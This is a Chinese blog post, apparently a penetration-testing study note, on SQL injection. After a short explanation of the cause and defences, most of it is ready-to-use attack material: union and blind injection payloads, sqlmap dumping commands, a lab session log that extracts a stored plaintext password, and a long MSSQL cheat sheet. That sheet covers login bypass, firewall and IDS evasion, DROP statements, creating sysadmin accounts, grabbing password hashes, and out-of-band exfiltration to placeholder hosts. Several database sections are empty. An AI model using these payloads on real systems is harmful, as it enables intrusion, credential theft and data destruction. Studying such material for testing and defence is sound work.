---
title: SQL 注入精要
date: 2026-03-21T15:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - SQL注入
  - MYSQL
  - MSSQL
  - 技术
---
## SQL 注入原理

SQL 注入的根本原因是代码与数据的混淆：应用程序把用户输入直接拼接进了 SQL 语句，而数据库无法区分 “哪些是开发者写好的指令、哪些是用户传进来的数据”，于是把用户输入也当成 SQL 代码的一部分解析执行。

例如：

```sql
SELECT * FROM users WHERE name = '$input'
```

正常情况下 `$input` 是一个用户名。如果传入 ` OR 1=1`，拼出来就变成 `WHERE name = '' OR 1=1` 恒为真，整张表都被返回。这里的用户输入的单引号逃逸了数据的范围，闭合掉前面的引号，后面的内容就被当成了 SQL 逻辑。

按是否回显能分为回显注入（union 联合查询、报错注入）和盲注（页面不回显数据，靠布尔真假或时间延迟一位一位地猜，还有带外/DNS注入）；按注入点位置可以分为 GET/POST/Cookie/Header 等参数。

防御上可以使用预编译/参数化查询。参数化把 SQL 语句地结构先编译固定下来，用户数据是之后再作为纯数据绑定进去的。这样无论用户传什么，永远只能是数据，不可能改变查询结构。结构先编译，数据后绑定。

白名单校验，限定只能是预先允许的几个值，而不是去过滤特殊字符。

最小限原则，只给业务必须的权限，不给 DROP、不给跨库读、关闭文件的读写权限

## 手工注入

### 简单的注入

当获得一个登入框时可以尝试使用最简单的语句尝试是否存在 sql 注入漏洞。

```bash
' or 1=1 -- -
```

### 探测 Columns

确认有 sql 注入漏洞后可使用 `order by` 或 `group by` 探测 Columns。
`
```bash
' order by 3 -- -
```

### 联合查询

使用 `union` 进一步探测信息。

探测显示数据的位置，这里假设为 3。

```bash
' union select 1,2,3 -- -
```

探测数据库的版本。

```bash
' union select 1,2,version() -- -
```

探测数据库名称。

```bash
' union select 1,2,database() -- -
```

探测用户名称。

```bash
' union select 1,2,user() -- -
```

探测 Tables 表。

```bash
' union select 1,2,TABLE_SCHEMA from INFORMATION_SCHEMA.tables -- -
```

探测 Tables 名。

```bash
' union select 1,2,table_name from INFORMATION_SCHEMA.tables -- -
```

探测 Columns 表。

```bash
' union select 1,2,column_name from INFORMATION_SCHEMA.columns where table_name='users' -- -
```

探测 Users。

```bash
' union select 1,2,user from users -- -
```

探测 Password。

```bash
' union select 1,2,pass from users -- -
```

### 复合 union 查询

`group_concat` 将多行结果合并成一个逗号分割的字符串，如 `enil,malus,marcbark,enilmalus`。

```bash
' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()
```

### Boolean 盲注

有时候网页仅返回 `True` or `False`，可以利用判断注入是否正确。

测试数据库名称有多少字符。

```bash
curl "http://10.10.10.15/index.php?search=' and (length(database())) = 1 -- -
result：true
```

```bash
curl "http://10.10.10.15/index.php?search=' and (length(database())) = 2 -- -
result：true
```

```bash
curl "http://10.10.10.15/index.php?search=' and (length(database())) = 4 -- -
result：true
```

```bash
curl "http://10.10.10.15/index.php?search=' and (length(database())) = 5 -- -
result：false
```

逐个判断字，`substr(字符串,起始位a,长度1)` 街区数据库的第 a 个字符。

```bash
curl "http://10.10.10.15/index.php?search=' and (ascii(substr((select database()),1,1))) = 115 -- -
result：false
```

### Time 盲注

有时页面无任何回显、真假响应时间也一致，可以通过让数据库响应延迟来判断注入的对错。

```bash
条件为真 → sleep(5) → 响应延迟 5 秒 → 猜测正确
条件为假 → 不触发   → 响应立即返回 → 猜测错误
```

判断是否存在注入。

```bash
' and sleep(5) -- -
```

判断数据库名称长度。

```bash
' and if(length(database()) = 8,sleep(5),0) -- -
```

### 报错注入

#### updatexml()

```bash
updatexml(1, concat(0x7e, (select user())), 1)
```

#### extractvalue()

```bash
extractvalue(1, concat(0x7e, (select database())))
```

## Sqlmap 自动注入

### 常用注入流程

使用 sqlmap 探测数据库信息，强度为 level 3，level 默认为 1，数字越大强度越高。

```bash
sudo sqlmap -u "http://10.10.10.15/login" --dbs --level 3 --batch
```

探测 tables。

```bash
sudo sqlmap -u "http://10.10.10.15/login" -D Enils --tables --level 3 --batch
```

探测 volumns。

```bash
sudo sqlmap -u "http://10.10.10.15/login" -D Enils -T Malus --columns --level 3 --batch
```

爆破数据。

```bash
sudo sqlmap -u "http://10.10.10.15/login" -D Enils -T Malus -V marcbark --dump --level 3 --batch
```

- level：1 为快速扫描，只测试基础的注入点；2 新增对 Cookie 的检测；3 测试 HTTP 请求头，适合怀疑头注入的场景；4 测试 Host 头，并测试更复杂的编码方式；5 最全面，测试所有的 HTTP 头
- risk：1 只使用 SELECT 语句测试，不修改数据；2 加入基于时间的盲注；3 加入 OR 型注入

## Mssql 查询小记

查询基本信息，和 nmap 扫描结果一致，且没有 `xp_cmdshell` 权限。

```bash
SQL (admin  admin@master)> SELECT SYSTEM_USER,SUSER_NAME(),CURRENT_USER;
                        
-----   -----   -----   
admin   admin   admin   
SQL (admin  admin@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
0   
SQL (admin  admin@master)> SELECT @@version;
                                                                                                                                                                                                          
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2014 - 12.0.2000.8 (X64) 
        Feb 20 2014 20:04:26 
        Copyright (c) Microsoft Corporation
        Express Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1) (Hypervisor)

```

- SYSTEM_USER：当前连接 SQL Server 时使用的服务器级登录名（Login）
- SUSER_NAME：当前服务器安全上下文对应的登录名，用于确认当前实际生效的 Login
- CURRENT_USER：当前数据库中的数据用户（User）身份
- sysadmin 是 MSSQL 最强的服务器级角色，1 代表属于，0代表不属于

爆破 tables。

```bash
SQL (admin  admin@orcharddb)> SELECT table_schema,table_name FROM information_schema.tables ORDER BY table_name;                                                                                                  
table_schema   table_name                                             
------------   ----------------------------------------------------   
dbo            blog_Common_BodyPartRecord                             
dbo            blog_Common_CommonPartRecord                           
dbo            blog_Common_CommonPartVersionRecord                    
dbo            blog_Common_IdentityPartRecord                         
dbo            blog_Containers_ContainablePartRecord                  
dbo            blog_Containers_ContainerPartRecord                    
dbo            blog_Containers_ContainerWidgetPartRecord              
dbo            blog_Navigation_AdminMenuPartRecord                    
dbo            blog_Navigation_MenuPartRecord                         
dbo            blog_Orchard_Alias_ActionRecord                        
dbo            blog_Orchard_Alias_AliasRecord                         
dbo            blog_Orchard_Autoroute_AutoroutePartRecord             
dbo            blog_Orchard_Blogs_BlogArchivesPartRecord              
dbo            blog_Orchard_Blogs_BlogPartArchiveRecord               
dbo            blog_Orchard_Blogs_RecentBlogPostsPartRecord           
dbo            blog_Orchard_Comments_CommentPartRecord                
dbo            blog_Orchard_Comments_CommentsPartRecord               
dbo            blog_Orchard_ContentPicker_ContentMenuItemPartRecord   
dbo            blog_Orchard_Framework_ContentItemRecord               
dbo            blog_Orchard_Framework_ContentItemVersionRecord        
dbo            blog_Orchard_Framework_ContentTypeRecord               
dbo            blog_Orchard_Framework_CultureRecord                   
dbo            blog_Orchard_Framework_DataMigrationRecord             
dbo            blog_Orchard_Framework_DistributedLockRecord           
dbo            blog_Orchard_MediaLibrary_MediaPartRecord              
dbo            blog_Orchard_MediaProcessing_FileNameRecord            
dbo            blog_Orchard_MediaProcessing_FilterRecord              
dbo            blog_Orchard_MediaProcessing_ImageProfilePartRecord    
dbo            blog_Orchard_OutputCache_CacheParameterRecord          
dbo            blog_Orchard_Packaging_PackagingSource                 
dbo            blog_Orchard_Recipes_RecipeStepResultRecord            
dbo            blog_Orchard_Roles_PermissionRecord                    
dbo            blog_Orchard_Roles_RoleRecord                          
dbo            blog_Orchard_Roles_RolesPermissionsRecord              
dbo            blog_Orchard_Roles_UserRolesPartRecord                 
dbo            blog_Orchard_Tags_ContentTagRecord                     
dbo            blog_Orchard_Tags_TagRecord                            
dbo            blog_Orchard_Tags_TagsPartRecord                       
dbo            blog_Orchard_Taxonomies_TaxonomyPartRecord             
dbo            blog_Orchard_Taxonomies_TermContentItem                
dbo            blog_Orchard_Taxonomies_TermPartRecord                 
dbo            blog_Orchard_Taxonomies_TermsPartRecord                
dbo            blog_Orchard_Users_UserPartRecord                      
dbo            blog_Orchard_Widgets_LayerPartRecord                   
dbo            blog_Orchard_Widgets_WidgetPartRecord                  
dbo            blog_Orchard_Workflows_ActivityRecord                  
dbo            blog_Orchard_Workflows_AwaitingActivityRecord          
dbo            blog_Orchard_Workflows_TransitionRecord                
dbo            blog_Orchard_Workflows_WorkflowDefinitionRecord        
dbo            blog_Orchard_Workflows_WorkflowRecord                  
dbo            blog_Scheduling_ScheduledTaskRecord                    
dbo            blog_Settings_ContentFieldDefinitionRecord             
dbo            blog_Settings_ContentPartDefinitionRecord              
dbo            blog_Settings_ContentPartFieldDefinitionRecord         
dbo            blog_Settings_ContentTypeDefinitionRecord              
dbo            blog_Settings_ContentTypePartDefinitionRecord          
dbo            blog_Settings_ShellDescriptorRecord                    
dbo            blog_Settings_ShellFeatureRecord                       
dbo            blog_Settings_ShellFeatureStateRecord                  
dbo            blog_Settings_ShellParameterRecord                     
dbo            blog_Settings_ShellStateRecord                         
dbo            blog_Title_TitlePartRecord
```

爆破 `blog_Orchard_Users_UserPartRecord` 的 columns。

```bash
SQL (admin  admin@orcharddb)> SELECT column_name FROM information_schema.columns WHERE table_name='blog_Orchard_Users_UserPartRecord';
column_name           
-------------------   
Id                    
UserName              
Email                 
NormalizedUserName    
Password              
PasswordFormat        
HashAlgorithm         
PasswordSalt          
RegistrationStatus    
EmailStatus           
EmailChallengeToken   
CreatedUtc            
LastLoginUtc          
LastLogoutUtc
```

爆破 `blog_Orchard_Users_UserPartRecord` 中的具体敏感信息得到用户凭据 `james:J@m3s_P@ssW0rd!`。

```bash
SQL (admin  admin@orcharddb)> SELECT Id,UserName,Email,NormalizedUserName,Password,PasswordFormat,HashAlgorithm,PasswordSalt FROM blog_Orchard_Users_UserPartRecord;
Id   UserName   Email             NormalizedUserName   Password                                                               PasswordFormat   HashAlgorithm   PasswordSalt               
--   --------   ---------------   ------------------   --------------------------------------------------------------------   --------------   -------------   ------------------------   
 2   admin                        admin                AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==   Hashed           PBKDF2          UBwWF1CQCsaGc/P7jIR/kg==   
15   James      james@htb.local   james                J@m3s_P@ssW0rd!                                                        Plaintext        Plaintext       NA
```


## 八种常见数据库 SQL 注入语句

### MSSQL

|                               查询                               | 命令                                                                                                                                                                                                                                                        |
| :------------------------------------------------------------: | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|                            Version                             | SELECT @@VERSION;                                                                                                                                                                                                                                         |
|                           List Users                           | SELECT name FROM master..syslogins;                                                                                                                                                                                                                       |
|                          Current User                          | SELECT user_name();                                                                                                                                                                                                                                       |
|                                                                | SELECT system_user;                                                                                                                                                                                                                                       |
|                                                                | SELECT user;                                                                                                                                                                                                                                              |
|                                                                | SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID;                                                                                                                                                                                              |
|                       List all Database                        | SELECT name FROM master..sysdatabases;                                                                                                                                                                                                                    |
|                                                                | SELECT DB_NAME(N);<br>其中N=1,2,3...                                                                                                                                                                                                                        |
|                        Current Database                        | SELECT DB_NAME();                                                                                                                                                                                                                                         |
|                          List Tables                           | SELECT name FROM sysobjects WHERE xtype='U';                                                                                                                                                                                                              |
|                          Column Names                          | SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='tablenameforcolumnnames');<br><br>                                                                                                                                            |
|                                                                | SELECT master..syscolumns.name,TYPE_NAME(master..syscolumns.xtype) FROM master.syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';                                                   |
|                         Select Nth Row                         | SELECT TOP 1 name FROM(SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC;                                                                                                                                                 |
|                        Select Nth Char                         | SELECT substring(‘abcd’, 3, 1);                                                                                                                                                                                                                           |
|                          If Statement                          | IF (1=1) SELECT 1 ELSE SELECT 2;                                                                                                                                                                                                                          |
|                         Case Statement                         | SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END;                                                                                                                                                                                                                   |
|                            Comments                            | SELECT 1;                                                                                                                                                                                                                                                 |
|                                                                | SELECT /\*comment\*/1;                                                                                                                                                                                                                                    |
|                     String without Quotes                      | SELECT CHAR(75)+CHAR(76)+CHAR(77);                                                                                                                                                                                                                        |
|                           Time Delay                           | WAITFOR DELAY ’0:0:5′;                                                                                                                                                                                                                                    |
|                       Command Execution                        | EXEC xp_cmdshell                                                                                                                                                                                                                                          |
|                       Make DNS Requests                        | declare @host varchar(800); select @host = name FROM master..syslogins; exec(‘master..xp_getfiledetails ”\’ + @host + ‘c$boot.ini”’);                                                                                                                     |
|                                                                | declare @host varchar(800); select @host = name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) + ‘.2.pentestmonkey.net’ from sys.sql_logins; exec(‘xp_fileexist ”\’ + @host + ‘c$boot.ini”’);                                                        |
|                    Bypassing Login Screens                     | admin' --                                                                                                                                                                                                                                                 |
|                                                                | admin' #                                                                                                                                                                                                                                                  |
|                                                                | admin'/\*                                                                                                                                                                                                                                                 |
|                                                                | ' or 1=1—                                                                                                                                                                                                                                                 |
|                                                                | ' or 1=1#                                                                                                                                                                                                                                                 |
|                                                                | or 1=1/\*                                                                                                                                                                                                                                                 |
|                                                                | ') or '1'='1—                                                                                                                                                                                                                                             |
|                                                                | ') or ('1'='1--                                                                                                                                                                                                                                           |
|               Bypassing Admin Panel of a Website               | ‘ or 1=1 --                                                                                                                                                                                                                                               |
|                                                                | 1'or’1'=’1                                                                                                                                                                                                                                                |
|                                                                | admin’--                                                                                                                                                                                                                                                  |
|                                                                | ” or 0=0 --                                                                                                                                                                                                                                               |
|                                                                | or 0=0 --                                                                                                                                                                                                                                                 |
|                                                                | ‘ or 0=0 #                                                                                                                                                                                                                                                |
|                                                                | ” or 0=0 #                                                                                                                                                                                                                                                |
|                                                                | or 0=0 #                                                                                                                                                                                                                                                  |
|                                                                | ‘ or ‘x’='x                                                                                                                                                                                                                                               |
|                                                                | ” or “x”=”x                                                                                                                                                                                                                                               |
|                                                                | ‘) or (‘x’='x                                                                                                                                                                                                                                             |
|                                                                | ‘ or 1=1--                                                                                                                                                                                                                                                |
|                                                                | ” or 1=1--                                                                                                                                                                                                                                                |
|                                                                | or 1=1--                                                                                                                                                                                                                                                  |
|                       Bypassing Firewall                       | /?id=1/\*union\*/union/\*select\*/select+1,2,3/\*                                                                                                                                                                                                         |
|                                                                | /?id=1;select+1&id=2,3+from+users+where+id=1—                                                                                                                                                                                                             |
|                                                                | /?a=1+union/\*&b=\*/select+1,2                                                                                                                                                                                                                            |
|                                                                | /?a=1+union/\*&b=\*/select+1,pass/\*&c=\*/ from+users—                                                                                                                                                                                                    |
|                                                                | /?id=1+OR+0x50=0x50                                                                                                                                                                                                                                       |
|                                                                | /?id=1+and+ascii(lower(mid((select+pwd+from+ users+limit+1,1),1,1)))=74                                                                                                                                                                                   |
|                                                                | /?id=1+union+(select+'xz'from+xxx)                                                                                                                                                                                                                        |
|                                                                | /?id=(1)union(select(1),mid(hash,1,32)from(users))                                                                                                                                                                                                        |
|                                                                | /?id=1+union+(select'1',concat(login,hash)from+users)                                                                                                                                                                                                     |
|                                                                | /?id=(1)union(((((((select(1),hex(hash)from(users))))))))                                                                                                                                                                                                 |
|                                                                | /?id=xx(1)or(0x50=0x50)                                                                                                                                                                                                                                   |
|                                                                | ?page_id=null%0A/\*\*//\*!50000%55nIOn\*//\*yoyu\*/all/\*\*/%0A/\*! %53eLEct\*/%0A/\*nnaa\*/+1,2,3,4…                                                                                                                                                     |
|                      Database Enumeration                      | ' and 1 in (select min(name) from master.dbo.sysdatabases where name >'.' ) –                                                                                                                                                                             |
|                                                                | ' and 1 in (select min(filename) from master.dbo.sysdatabases where filename >'.' ) –                                                                                                                                                                     |
|          Tables and Columns Enumeration in one Query           | ' union select 0, sysobjects.name + ': ' + syscolumns.name + ': ' + systypes.name, 1, 1, '1', 1, 1, 1, 1, 1 from sysobjects, syscolumns, systypes where sysobjects.xtype = 'U' AND sysobjects.id = syscolumns.id AND syscolumns.xtype = systypes.xtype -- |
|         Bypassing Second MD5 Hash Check Login Screens          | Username : admin Password : 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055 81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)                                                                                                       |
|                         Stacked Query                          | ProductID=1; DROP members--                                                                                                                                                                                                                               |
|                        Union Injections                        | SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members                                                                                                                                                                                     |
|                                                                | ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--                                                                                                                                                                                                     |
|                      Log in as Admin User                      | DROP sampletable;--                                                                                                                                                                                                                                       |
|                                                                | DROP sampletable;# Username: admin'-- SELECT \* FROM members WHERE username = 'admin'--' AND password = 'password'                                                                                                                                        |
|                         List Passwords                         | SELECT name, password FROM master..sysxlogins;                                                                                                                                                                                                            |
|                                                                | SELECT name, password_hash FROM master.sys.sql_logins;                                                                                                                                                                                                    |
|                      List Password Hashes                      | SELECT name, password FROM master..sysxlogins                                                                                                                                                                                                             |
|                                                                | SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins                                                                                                                                                                               |
|                                                                | SELECT name, password_hash FROM master.sys.sql_logins                                                                                                                                                                                                     |
|                                                                | SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins                                                                                                                                                                |
|                       Password Grabbing                        | '; begin declare @var varchar(8000) set @var=':' select @var=@var+' '+login+'/'+password+' ' from users where login>@var select @var as var into temp end -- ' and 1 in (select var from temp) -- ' ; drop table temp --                                  |
|                          Create Users                          | EXEC sp_addlogin 'user', 'pass';                                                                                                                                                                                                                          |
|                           Drop User                            | EXEC sp_droplogin 'user';                                                                                                                                                                                                                                 |
|                         Make User DBA                          | EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;                                                                                                                                                                                                    |
|                       Create DB Accounts                       | exec sp_addlogin 'name' , 'password'                                                                                                                                                                                                                      |
|                                                                | exec sp_addsrvrolemember 'name' , 'sysadmin'                                                                                                                                                                                                              |
|                     Discover DB Structure                      | ' group by columnnames having 1=1 --                                                                                                                                                                                                                      |
|                                                                | ' union select sum(columnname ) from tablename --                                                                                                                                                                                                         |
|                                                                | ' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --                                                                                                                                                                         |
|                       Local File Access                        | CREATE TABLE mydata (line varchar(8000)); BULK INSERT mydata FROM ‘c:boot.ini’; DROP TABLE mydata;                                                                                                                                                        |
|                      Hostname, IP Address                      | SELECT HOST_NAME();                                                                                                                                                                                                                                       |
|      Error Based SQLi attack: To throw Conversion Errors       | For integer inputs: convert(int,@@version);                                                                                                                                                                                                               |
|                                                                | For string inputs: ‘ + convert(int,@@version) +’;                                                                                                                                                                                                         |
| Clear SQLi Tests: For Boolean SQL Injection and Silent Attacks | product.asp?id=4;                                                                                                                                                                                                                                         |
|                                                                | product.asp?id=5-1;                                                                                                                                                                                                                                       |
|                                                                | product.asp?id=4 OR 1=1;                                                                                                                                                                                                                                  |
|                                                                | Error Messages                                                                                                                                                                                                                                            |
|                                                                | SELECT \* FROM master..sysmessages;                                                                                                                                                                                                                       |
|                 Server Name and Configuration                  | ' and 1 in (select @@servername)--                                                                                                                                                                                                                        |
|                                                                | ' and 1 in (select servername from sys.sysservers)--                                                                                                                                                                                                      |
|                     IDS Signature Evasion                      | OR 'john' = 'john'                                                                                                                                                                                                                                        |
|                                                                | ' OR 'microsoft' = 'micro'+'soft'                                                                                                                                                                                                                         |
|                                                                | ' OR 'movies' = N'movies'                                                                                                                                                                                                                                 |
|                                                                | ' OR 'software' like 'soft%'                                                                                                                                                                                                                              |
|                                                                | ' OR 7 > 1                                                                                                                                                                                                                                                |
|                                                                | 'OR 'best' > 'b'                                                                                                                                                                                                                                          |
|                                                                | ' OR 'whatever' IN ('whatever')                                                                                                                                                                                                                           |
|                                                                | ' OR 5 BETWEEN 1 AND 7                                                                                                                                                                                                                                    |
|              IDS Signature Evasion using Comments              | '/\\*\\*/OR/\\*\\*/1/\\*\\*/=/\\*\\*/1                                                                                                                                                                                                                    |
|                                                                | Username:' or 1/\*                                                                                                                                                                                                                                        |
|                                                                | Password:\*/=1--                                                                                                                                                                                                                                          |
|                                                                | UNI/\*\*/ON SEL/\*\*/ECT                                                                                                                                                                                                                                  |
|                                                                | (MS SQL) '; EXEC ('SEL' + 'ECT US' + 'ER')                                                                                                                                                                                                                |
|                  Time Based SQLi Exploitation                  | ?vulnerableParam=1;DECLARE @x as int;DECLARE @w as char(6);SET @x=ASCII(SUBSTRING(({INJECTION}),1,1));IF @x=100 SET @w='0:0:14' ELSE SET @w='0:0:01';WAITFOR DELAY @w— {INJECTION} = You want to run the query.                                           |
|                      Out of Band Channel                       | ?vulnerableParam=1; SELECT * FROM OPENROWSET('SQLOLEDB', ({INJECT})+'.yourhost.com';'sa';'pwd', 'SELECT 1');                                                                                                                                              |
|                                                                | ?vulnerableParam=1; DECLARE @q varchar(1024); SET @q = '\\'+({INJECT})+'.yourhost.com\\test.txt'; EXEC master..xp_dirtree @q                                                                                                                              |
|                       Default Databases                        | Northwind                                                                                                                                                                                                                                                 |
|                                                                | Model                                                                                                                                                                                                                                                     |
|                                                                | Sdb                                                                                                                                                                                                                                                       |
|                                                                | pubs                                                                                                                                                                                                                                                      |
|                                                                | tempdb                                                                                                                                                                                                                                                    |
|                   Creating Database Accounts                   | exec sp_addlogin 'victor', 'Pass123'                                                                                                                                                                                                                      |
|                                                                | exec sp_addsrvrolemember 'victor', 'sysadmin'                                                                                                                                                                                                             |
|                        Path of DB files                        | %PROGRAM_FILES%\Microsoft SQL Server\MSSQL.1\MSSQL\Data\                                                                                                                                                                                                  |
|                      Location of DB Files                      | EXEC sp_helpdb master;                                                                                                                                                                                                                                    |
|                                                                | EXEC sp_helpdb pubs;                                                                                                                                                                                                                                      |
|                           Privileges                           | SELECT permission_name FROM master..fn_my_permissions(null, ‘DATABASE’);                                                                                                                                                                                  |
|                                                                | SELECT permission_name FROM master..fn_my_permissions(null, ‘SERVER’);                                                                                                                                                                                    |
|                                                                | SELECT permission_name FROM master..fn_my_permissions(‘master..syslogins’, ‘OBJECT’);                                                                                                                                                                     |
|                                                                | SELECT permission_name FROM master..fn_my_permissions(‘sa’, ‘USER’);                                                                                                                                                                                      |
|                                                                | SELECT is_srvrolemember(‘sysadmin’);                                                                                                                                                                                                                      |
|                                                                | SELECT is_srvrolemember(‘dbcreator’);                                                                                                                                                                                                                     |
|                                                                | SELECT is_srvrolemember(‘bulkadmin’);                                                                                                                                                                                                                     |
|                                                                | SELECT is_srvrolemember(‘diskadmin’);                                                                                                                                                                                                                     |
|                                                                | SELECT is_srvrolemember(‘processadmin’);                                                                                                                                                                                                                  |
|                                                                | SELECT is_srvrolemember(‘serveradmin’);                                                                                                                                                                                                                   |
|                                                                | SELECT is_srvrolemember(‘setupadmin’);                                                                                                                                                                                                                    |
|                                                                | SELECT is_srvrolemember(‘securityadmin’);                                                                                                                                                                                                                 |
|                                                                | SELECT name FROM master..syslogins WHERE denylogin = 0;                                                                                                                                                                                                   |
|                                                                | SELECT name FROM master..syslogins WHERE hasaccess = 1;                                                                                                                                                                                                   |
|                                                                | SELECT name FROM master..syslogins WHERE isntname = 0;                                                                                                                                                                                                    |
|                                                                | SELECT name FROM master..syslogins WHERE isntgroup = 0;                                                                                                                                                                                                   |
|                                                                | SELECT name FROM master..syslogins WHERE sysadmin = 1;                                                                                                                                                                                                    |
|                                                                | SELECT name FROM master..syslogins WHERE securityadmin = 1;                                                                                                                                                                                               |
|                                                                | SELECT name FROM master..syslogins WHERE serveradmin = 1;                                                                                                                                                                                                 |
|                                                                | SELECT name FROM master..syslogins WHERE setupadmin = 1;                                                                                                                                                                                                  |
|                                                                | SELECT name FROM master..syslogins WHERE processadmin = 1;                                                                                                                                                                                                |
|                                                                | SELECT name FROM master..syslogins WHERE diskadmin = 1;                                                                                                                                                                                                   |
|                                                                | SELECT name FROM master..syslogins WHERE dbcreator = 1;                                                                                                                                                                                                   |
|                                                                | SELECT name FROM master..syslogins WHERE bulkadmin = 1;                                                                                                                                                                                                   |
|                 Identify User Level Privilege                  | user or current_user, session_user, system_user                                                                                                                                                                                                           |
|                                                                | ' and 1 in (select user ) --                                                                                                                                                                                                                              |
|                                                                | '; if user ='dbo' waitfor delay '0:0:5 '--                                                                                                                                                                                                                |
|                                                                | ' union select if( user() like 'root@%', benchmark(50000,sha1('test')), 'false' );                                                                                                                                                                        |

### MySQL

| 查询  | 命令  |
| :-: | :-- |
|     |     |
### Oracle

| 查询  | 命令  |
| :-: | :-- |
|     |     |
|     |     |
### IBM-DB2 SQL

| 查询  | 命令  |
| :-: | :-- |
|     |     |
### Ingres SQL

| 查询  | 命令  |
| :-: | :-- |
|     |     |
### Informix SQL

| 查询  | 命令  |
| :-: | :-- |
|     |     |
### Postgre SQL

| 查询  | 命令  |
| :-: | :-- |
|     |     |
### MS ACCESS

| 查询  | 命令  |
| :-: | :-- |
|     |     |